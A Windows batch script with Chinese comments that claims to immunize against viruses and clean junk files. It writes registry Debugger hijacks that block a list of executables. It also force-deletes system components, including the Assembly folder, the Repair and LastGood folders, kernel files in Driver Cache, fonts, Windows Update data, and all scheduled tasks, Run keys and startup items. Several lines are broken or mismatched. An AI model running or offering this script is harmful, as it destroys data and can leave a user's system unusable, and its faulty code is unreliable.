echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\adaware.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\alevir.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\aqadcup.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\archive.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\arr.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ARUpdate.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\asm.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\av.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avserve.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avserve2.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\backWeb.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bargains.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\basfipm.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\belt.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Biprep.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\blss.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bokja.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bootconf.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bpc.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\brasil.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BRIDGE.DLL]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Buddy.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BUGSFIX.EXE]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bundle.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bvt.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cashback.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cdaEngine.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd32.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmesys.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\conime.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\conscorr.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\crss.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cxtpls.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\datemanager.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dcomx.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Desktop.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\directs.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\divx.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dllreg.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dmserver.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dpi.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dssagent.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dvdkeyauth.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\emsw.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\exdl.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\exec.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EXP.EXE]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explore.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explored.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Fash.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logo_1.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logo_2.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\worm.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\worm.htm]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\1_.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\2_.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\3_.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pif.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FuckJacks.exe]>>Fix.reg
echo "Debugger"="c:\\病毒类.exe">>Fix.reg
echo.
echo 常见病毒注册表免疫中。。。。。。
echo.
echo off
start /w regedit /s Fix.reg
Set-ItemProperty -Path "HKLM: SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force
del Fix.reg
cls
echo 开始清理垃圾...
cls
:jiliqingli
title 正在清理垃圾...
cls
Del /a/f/s/q "%CurUser%\Local Settings\Temporary Internet Files\*.*"
Del /a/f/s/q "%CurUser%\Local Settings\History\*.*"
Del /a/f/s/q "%CurUser%\NetHood\*.*"
Del /a/f/s/q "%CurUser%\PrintHood\*.*"
Del /a/f/s/q "%CurUser%\Recent\*.*"
Del /a/f/s/q "%CurUser%\Cookies\*.*"
Del /a/f/q "%CurUser%\Local Settings\Application Data\IconCache.db"
Del /a/f/s/q "%WinDir%\Temp\*.*"
Del /a/f/s/q "%WinDir%\Prefetch\*.*"
Del /a/f/s/q "%WinDir%\Inf\*.PNF"
Del /a/f/s/q "%SysDir%\ReinstallBackups\*.*"
Rd /s/q "%WinDir%\ime\CHTIME"
Rd /s/q "%WinDir%\ime\IMJP8_1"
Rd /s/q "%WinDir%\ime\imejp"
Rd /s/q "%WinDir%\ime\imejp98"
Rd /s/q "%WinDir%\ime\IMKR6_1"
Del /a/f/q "%WinDir%\ime\CHTIME\Applets\HWXCHT.DLL"
Rd /s/q "%SysDir%\IME\CINTLGNT"
Rd /s/q "%SysDir%\IME\TINTLGNT"
Del /a/f/q "%WinDir%\Fonts\gulim.ttc"
Del /a/f/q "%WinDir%\Fonts\msgothic.ttc"
Del /a/f/s/q "%ProgFile%\Outlook Express\*.txt
Del /a/f/s/q "%ProgFile%\Online Services\*.*
Rd /s/q "%ProgFile%\Messenger"
Rd /s/q "%ProgFile%\Movie Maker"
Rd /s/q "%ProgFile%\MSN Gaming Zone"
Rd /s/q "%ProgFile%\NetMeeting"
Rd /s/q "%WinDir%\LastGood"
Rd /s/q "%WinDir%\Repair"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrnlmp.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrnlpa.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntkrpamp.exe"
Del /a/f/q "%WinDir%\Driver Cache\i386\ntoskrnl.exe"
Del /a/f/s/q "%AllUser%\「开始」菜单\Windows Catalog.*
Del /a/f/s/q "%AllUser%\「开始」菜单\Windows Update.*
Rd /s/q "%CurUser%\Application Data\ACD Systems
Del /a/f/s/q "%ProgFile%\ACDSee\*.hlp"
Del /a/f/s/q "%ProgFile%\ACDSee\*.cnt"
Del /a/f/s/q "%ProgFile%\ACDSee\PlugIns\*.hlp
Del /a/f/s/q "%ProgFile%\ACDSee\PlugIns\*.chm
Del /a/f/s/q "%ProgFile%\Ringz St io\Storm Codec\*.txt
Del /a/f/s/q "%ProgFile%\Ringz St io\Storm Codec\*.ini
Del /a/f/s/q "%ProgFile%\Ringz St io\Storm Codec\*.dat
Del /a/f/s/q "%ProgFile%\Ringz St io\Storm Codec\GSpot.exe
Del /a/f/s/q "%ProgFile%\Ringz St io\Storm Codec\StormSet.exe
Del /a/f/s/q "%ProgFile%\Ringz St io\Storm Codec\Codecs\lang ges\ffdshow.1033.en
Rd /s/q "%AllUser%\Application Data\Storm\Update
Rd /s/q "%AllUser%\「开始」菜单\程序\暴风影音
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\CoreVideo.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTime3GPP.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTime.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeA ioSupport.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeEssentials.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeH264.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeInternetExtras.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeMPEG4.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeStreaming.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeStreamingExtras.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeVR.Resources\en.lproj
Rd /s/q "%ProgFile%\Ringz St io\Storm Codec\QTSystem\QuickTimeWebHelper.Resources\en.lproj
Rd /s/q "%AllUser%\Documents\My Videos
Rd /s/q "%AllUser%\Documents\My Pictures
Rd /s/q "%AllUser%\Documents\My Music
Rd /s/q "%ProgFile%\Windows Media Player\Icons
Rd /s/q "%ProgFile%\Windows Media Player\Sample Playlists
Rd /s/q "%ProgFile%\Windows Media Player\Skins
Rd /s/q "%ProgFile%\Windows Media Player\Vis lizations
Del /a/f/s/q "%ProgFile%\Windows Media Player\*.txt
Del /a/f/s/q "%CurUser%\Application Data\Microsoft\Internet Explorer\Quick Launch\酷我音乐盒.*
Rd /s/q "%CurUser%\「开始」菜单\程序\酷我音乐盒
Del /a/f/s/q "%ProgFile%\KWMUSIC\readme.txt
Del /a/f/s/q "%ProgFile%\Microsoft Office\OFFICE11\2052\*.chm
Del /a/f/s/q "%ProgFile%\Microsoft Office\OFFICE11\2052\*.htm
Del /a/f/q "%AllUser%\「开始」菜单\程序\PPS 网络电视.*
Rd /s/q "%AllUser%\「开始」菜单\程序\PPStream
Del /a/f/s/q "%ProgFile%\PPStream\*.url
Del /a/f/s/q "%ProgFile%\PPStream\whatsnew.txt
Del /a/f/q "%ProgFile%\Real\RealPlayer\Setup\setup.exe"
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.chm
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.txt
Del /a/f/q "%ProgFile%\Real\RealPlayer\*.html
Rd /s/q "%ProgFile%\KWREAL"
Del /a/f/q "%ProgFile%\Thunder\Ay onfig.exe
Del /a/f/s/q "%ProgFile%\Thunder Network\Thunder\Program\Update\*.*"
Rd /s/q "%AllUser%\Application Data\Thunder Network\KanKan"
Rd /s/q "%ProgFile%\Thunder Network\Thunder\Components\KanKan"
Del /a/f/q "%ProgFile%\WinRAR\*.diz
Del /a/f/q "%ProgFile%\WinRAR\*.txt
Del /a/f/q "%ProgFile%\WinRAR\*.chm
Del /a/f/q "%ProgFile%\WinRAR\*.htm
Del /a/f/q "%ProgFile%\千千静听\readme.txt
Del /a/f/s/q "%CurUser%\Application Data\Microsoft\Internet Explorer\Quick Launch\千千静听.*
Del /a/f/q "%AllUser%\Application Data\UNISPIM\usrwl.dat"
Del /a/f/q "%CurUser%\Application Data\UNISPIM\usrwl.dat"
Rd /s/q "%WinDir%\MAGICSET"
Rd /s/q "%HomeDrive%\Found.*"
For /f "delims=" %%i in ('dir "%HomeDrive%\Found.*" /adh /b') do Rd /s/q "%HomeDrive%\%%i"
Del /a/f/q "%HomeDrive%\PageFile.sys"
Del /a/f/q "%HomeDrive%\HiberFil.sys"
echo.Rd /s/q "%WinDir%\$*$"
For /f "delims=" %%i in ('dir "%Windir%\$*$" /adh /b') do Rd /s/q "%WinDir%\%%i"
at /delete /yes||SCHTASKS /Delete /TN * /F
del /f /q /a %SYSTEMROOT%\Tasks
cls
echo 清理系统目录中的垃圾文件（需要一些时间...）
del /a /f /s /q "%SystemRoot%\*._mp"
del /a /f /s /q "%SystemRoot%\*.bak"
del /a /f /s /q "%SystemRoot%\*.dmp"
del /a /f /s /q "%SystemRoot%\*.gid"
del /a /f /s /q "%SystemRoot%\*.old"
del /a /f /s /q "%SystemRoot%\*.query"
del /a /f /q "%SystemRoot%\*.tmp"
rd /s /q "%SystemRoot%\Downloaded Program Files"
rd /s /q "%SystemRoot%\Offline Web Pages"
rd /s /q "%systemroot%\Connection Wizard"
rd /s /q "%SystemRoot%\SoftwareDistribution\Download"
rd /s /q "%SystemRoot%\Assembly"
rd /s /q "%SystemRoot%\Help"
rd /s /q "%SystemRoot%\ReinstallBackups"
del /a /s /q "%SystemRoot%\inf\*.pnf"
del /a /f /s /q "%SystemRoot%\inf\InfCache.1"
dir %SystemRoot%\inf\*.* /ad/b >%SystemRoot%\vTmp.txt
for /f %%a in (%SystemRoot%\vTmp.txt) do rd /s /q "%SystemRoot%\inf\%%a"
del /a /f /s /q "%SystemRoot%\driver?\*.pnf"
del /a /f /s /q "%SystemRoot%\driver?\InfCache.1" 
del /a /f /s /q "%SystemDrive%\driver?\*.pnf"
del /a /f /s /q "%SystemDrive%\driver?\InfCache.1"
rd /s /q "%SystemRoot%\temp" & md "%SystemRoot%\temp"
del /a /f /s /q "%SystemRoot%\Prefetch\*.*"
del /a /f /s /q "%SystemRoot%\minidump\*.*"
del /a /f /s /q "%userprofile%\AppData\Roaming\Adobe\Common\Media Cache Files\*.*"
cls
echo 清除CryptoAPI证书缓存...
del /a /f /s /q "%userprofile%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\*.*"
echo 清除无用的磁盘错误文件（系统分区）......
del /a /f /q "%SystemDrive%\*.chk"
dir %SystemDrive%\found.??? /ad/b >%SystemRoot%\vTmp.txt
for /f %%a in (%SystemRoot%\vTmp.txt) do rd /s /q "%SystemDrive%\%%a"
cls
echo 清理系统升级补丁（正确清除）......
dir %SystemRoot%\$*$ /ad/b >%SystemRoot%\vTmp.txt
for /f %%a in (%SystemRoot%\vTmp.txt) do rd /s /q "%SystemRoot%\%%a"
cls
echo 清理系统更新补丁（正确清除）......
del /a /f /q C:\Windows\SoftwareDistribution\Download\*.*
del /a /f /q C:\Windows\SoftwareDistribution\DataStore\*.*
cls
echo 清理普通软件垃圾项目（默认情况下）......
rd /s /q "%ProgramFiles%\InstallShield Installation Information"
Ren "%ProgramFiles%\Common~1\Real\Update_OB\realsched.exe" realsched.ex_
Del "%ProgramFiles%\Common~1\Real\Update_OB\realsched.exe"
Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v TkBellExe /f
rd /s /q "%ProgramFiles%\Tencent\QQGame\Download"
taskkill /f /im "TIMPlatform.exe" /t
del /a /f /s /q "%ProgramFiles%\Tencent\QQ\TIMPlatform.exe"
del /a /f /s /q "%ProgramFiles%\Kaspersky Lab\*.tmp"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.Office.Desktop_8wekyb3d8bbwe\AC\INetCache\container.dat"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.Office.Desktop_8wekyb3d8bbwe\AC\INetCache\Content.MSO"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.Office.Desktop_8wekyb3d8bbwe\AC\INetCache\Content.Word"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCache\*.*"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.People_8wekyb3d8bbwe\AC\INetCache\*.*"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\AC\INetCache\*.*"
del /a /f /s /q "%userprofile%\AppData\Local\Packages\Microsoft.ZuneVideo_8wekyb3d8bbwe\AC\INetCache\*.*"
del /a /f /s /q "%userprofile%\AppData\Roaming\Adobe\Flash Player\AssetCache\*.*"
del /a /f /s /q "%userprofile%\AppData\Roaming\Tencent\QQ\Misc\com.tencent.advertisement\*.*"
del /a /f /s /q "%userprofile%\AppData\Roaming\Tencent\QQ\Temp\*.*"
del /a /f /s /q "%userprofile%\AppData\LocalLow\Unity\Caches\GiCache\*.*"
del /a /f /s /q "%userprofile%\AppData\Loca\Netease\CloudMusic\Cache\Cache\*.*"
shutdown -a
cls
echo 清理cooking，IE缓存，历史等（当前用户）...
for /f "tokens=3*" %%a in (%temp%\cleantmp.txt) do (
for /d %%i in ("%%a %%b\*.*") do rd /s /q "%%i"
del /a /f /s /q "%%a %%b\*.*"
)
cls
echo 清理略缩图缓存...
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*.db"
cls
echo 清理Steam缓存...
del /a /f /s /q "%userprofile%\AppData\Local\Steam\htmlcache\Cache\*.*"
cls
echo MS Search...
del /a /f /s /q "C\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb"
echo 清理腾讯后台进程…
taskkill /f /im CrossProxy.exe
taskkill /f /im TenioDL.exe
taskkill /f /im Tencentdl.exe
taskkill /f /im TXPlatform.exe
taskkill /f /im TASLogin.exe
taskkill /f /im BackgroundDownloader.exe
taskkill /f /im QQLogin.exe
taskkill /f /im QQExternal.exe
taskkill /f /im TenSafe_1.exe
taskkill /f /im TenSafe_2.exe
taskkill /f /im TenSafe.exe
taskkill /f /im TenSafe.exe
taskkill /f /im QQDL.exe
taskkill /f /im Client.exe
taskkill /f /im YoukuMediaCenter.exe
cls
echo 清除腾讯产品日志...
del /a /f /s /q "%userprofile%\AppData\Roaming\Tencent\Logs\*.*“
del /a /f /s /q "%userprofile%\AppData\Roaming\Tencent\Tencentdl\*.*“
cls
echo 清除腾讯网迷你版缓存...
del /a /f /s /q "%userprofile%\AppData\Local\Tencent\MiniBrowser\UserData\GPUCache\*.*"
cls
echo 清理浏览器缓存...
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\LSTMJR0B\*.xml"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\MLHCN203\*.json"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\PLCY7J9R\*.json"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\QTILDK6V\*.ini"
rmdir /s /q "%userprofile%\AppData\Local\Microsoft\Windows\History\Low\History.IE5"
rmdir /s /q "%userprofile%\AppData\Local\Microsoft\Windows\History\Low"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE\X7M86UJG\*.etf"
rmdir /s /q "%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE\X7M86UJG"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE\LSTMJR0B\*.xml"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE\MLHCN203\*.xml"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE\PLCY7J9R\*.xml"
del /a /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\INetCache\IE\QTILDK6V\*.xml"
goto other123

:other123
sfc/purgecache
defrag%systemdrive%-b
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /t "REG_SZ" /d "My computer" /f
cls
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
cls
reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Cache>%temp%\cleantmp.txt
reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Cookies>>%temp%\cleantmp.txt
reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v History>>%temp%\cleantmp.txt
reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v NetHood>>%temp%\cleantmp.txt
reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Recent>>%temp%\cleantmp.txt
cls
(reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f)||(for /f "skip=4 tokens=1" %%a in ('reg  query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run') do reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v %%a /f)
(reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /va /f)||(for /f "skip=4 tokens=1" %%a in ('reg  query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run') do reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v %%a /f)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ctfmon.exe /d %SYSTEMROOT%\system32\ctfmon.exe /f 
del "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.*" /q /f
del "%USERPROFILE%\「开始」菜单\程序\启动\*.*" /q /f
del "%SYSTEMDRIVE%\Docume~1\Default User\「开始」菜单\程序\启动\*.*" /q /f
del "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\*.*" /q /f
del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\*.*" /q /f
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /va /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ctfmon.exe /d C:\WINDOWS\system32\ctfmon.exe
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1"
